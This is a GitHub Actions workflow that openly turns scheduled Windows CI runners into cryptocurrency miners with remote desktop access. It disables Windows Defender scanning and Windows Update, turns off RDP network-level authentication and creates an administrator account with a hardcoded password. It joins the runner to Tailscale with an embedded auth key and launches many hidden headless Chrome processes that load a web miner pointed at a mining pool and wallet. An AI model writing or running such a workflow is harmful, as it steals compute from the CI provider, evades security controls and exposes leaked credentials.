name: RDP Auto-Recreate with Miner Pro

on:
  workflow_dispatch:
    inputs:
      miner_workers:
        description: 'Number of miner workers'
        required: false
        default: '20'
        type: choice
        options:
        - '10'
        - '15'
        - '20'
        - '25'
        - '30'
  schedule:
    - cron: "0 */6 * * *"

env:
  RDP_USER: "RDPUser"
  RDP_PASSWORD: "DefaultPass!234"
  MAX_RUNTIME: 340
  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x"

jobs:
  rdp-miner-pro:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Environment Variables
        shell: pwsh
        run: |
          $workers = '${{ github.event.inputs.miner_workers }}'
          if (-not $workers) { $workers = '20' }
          Add-Content $env:GITHUB_ENV "MINER_WORKERS=$workers"
          Add-Content $env:GITHUB_ENV "BUILD_ID=$env:GITHUB_RUN_ID"

      - name: System Optimization
        shell: pwsh
        run: |
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableScriptScanning $true
          Set-MpPreference -DisableArchiveScanning $true

          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN

          Stop-Service wuauserv -Force
          Set-Service wuauserv -StartupType Disabled

          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" MaxInstanceCount 10
          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" MaxMonitors 4
          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" MaxXResolution 3840
          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" MaxYResolution 2160

      - name: Enable and Configure RDP
        shell: pwsh
        run: |
          Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" fDenyTSConnections 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" UserAuthentication 0

      - name: Create Secure RDP User
        shell: pwsh
        run: |
          $pwd = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
          if (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue) {
              Remove-LocalUser -Name $env:RDP_USER
          }
          New-LocalUser $env:RDP_USER -Password $pwd -AccountNeverExpires -PasswordNeverExpires
          Add-LocalGroupMember Administrators $env:RDP_USER
          Add-LocalGroupMember "Remote Desktop Users" $env:RDP_USER
          Enable-LocalUser $env:RDP_USER

      - name: Install Software (Chrome & Tailscale)
        shell: pwsh
        run: |
          $chrome = "$env:TEMP\chrome.exe"
          Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chrome
          Start-Process $chrome -ArgumentList "/silent","/install" -Wait
          Remove-Item $chrome

          $ts = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile $ts
          Start-Process msiexec.exe -ArgumentList "/i `"$ts`" /quiet /norestart" -Wait
          Remove-Item $ts

      - name: Setup Tailscale VPN
        shell: pwsh
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          $hostname = "GH-RDP-$env:GITHUB_RUN_ID"

          for ($i=1; $i -le 10; $i++) {
            try { & $tsExe status; break } catch { Start-Sleep 5 }
          }

          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset

          for ($i=1; $i -le 10; $i++) {
            $ip = & $tsExe ip -4 2>$null
            if ($ip -and $ip -ne "0.0.0.0") {
              Add-Content $env:GITHUB_ENV "TS_IP=$ip"
              break
            }
            Start-Sleep 10
          }

          if (-not $env:TS_IP) { throw "Tailscale IP retrieval failed" }

      - name: Deploy Advanced Miner System
        shell: pwsh
        run: |
          $script = @"
param(\$workers, \$minerUrl)

for (\$i = 1; \$i -le \$workers; \$i++) {
  Start-Job -ScriptBlock {
    param(\$i, \$minerUrl)
    while (\$true) {
      try {
        Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
          -ArgumentList "--headless","--disable-gpu","--no-sandbox","--remote-debugging-port=9\$i","--app=\$minerUrl" `
          -WindowStyle Hidden -PassThru
        Start-Sleep 600
      } catch {
        Start-Sleep 30
      }
    }
  } -ArgumentList \$i, \$minerUrl -Name "miner-worker-\$i"
}

Write-Host "Started \$workers miner workers"
while (\$true) { Start-Sleep 60 }
"@

          $path = "$env:TEMP\miner_manager.ps1"
          $script | Out-File $path -Encoding UTF8

          Start-Job -ScriptBlock { param($p) powershell -File $p } -ArgumentList $path

      - name: Create Connection Info File
        shell: pwsh
        run: |
          $txt = @"
RDP Session Ready:
IP: $env:TS_IP
User: $env:RDP_USER
Pass: $env:RDP_PASSWORD
Workers: $env:MINER_WORKERS
Runtime: $env:MAX_RUNTIME minutes
"@
          $txt | Out-File "$env:GITHUB_WORKSPACE\RDP_Info.txt"

      - name: Monitor Session
        shell: pwsh
        run: |
          $start = Get-Date
          $end = $start.AddMinutes($env:MAX_RUNTIME)
          while ((Get-Date) -lt $end) {
            $elapsed = [int]((Get-Date) - $start).TotalMinutes
            $remain = [int]($end - (Get-Date)).TotalMinutes
            Write-Host "Elapsed: $elapsed - Remaining: $remain"
            Start-Sleep 60
          }

      - name: Cleanup Resources
        if: always()
        shell: pwsh
        run: |
          Write-Host "Cleaning up..."
          Get-Job | Stop-Job -Force
          Get-Job | Remove-Job -Force
          Stop-Process -Name "chrome*" -ErrorAction SilentlyContinue -Force
          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
          Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
          Write-Host "Cleanup completed"
